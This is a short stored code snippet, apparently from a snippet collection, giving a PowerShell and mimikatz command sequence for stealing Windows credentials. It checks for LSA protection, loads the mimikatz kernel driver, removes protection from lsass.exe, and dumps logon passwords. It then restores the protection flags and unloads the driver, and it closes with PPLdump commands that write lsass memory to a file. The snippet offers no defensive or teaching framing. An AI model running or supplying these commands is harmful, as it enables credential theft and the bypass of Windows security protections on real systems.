---
id: 11cd72ba-15bd-4d28-bd72-4b26d00e0878
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:27.153944+00:00'
updated_at: '2023-04-10T20:37:14.421904+00:00'
---

# Code Snippet 11cd72ba

**Language**: Powershell

```powershell
# Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

# Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
# Now lets import the mimidriver.sys to the system
mimikatz # !+

# Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

# Finally run the logonpasswords function to dump lsass
mimikatz # privilege::debug    
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords

# Now lets re-add the protection flags to the lsass.exe process
mimikatz # !processprotect /process:lsass.exe

# Unload the service created
mimikatz # !-

# https://github.com/itm4n/PPLdump
PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
PPLdump.exe lsass.exe lsass.dmp
PPLdump.exe -v 720 out.dmp
```
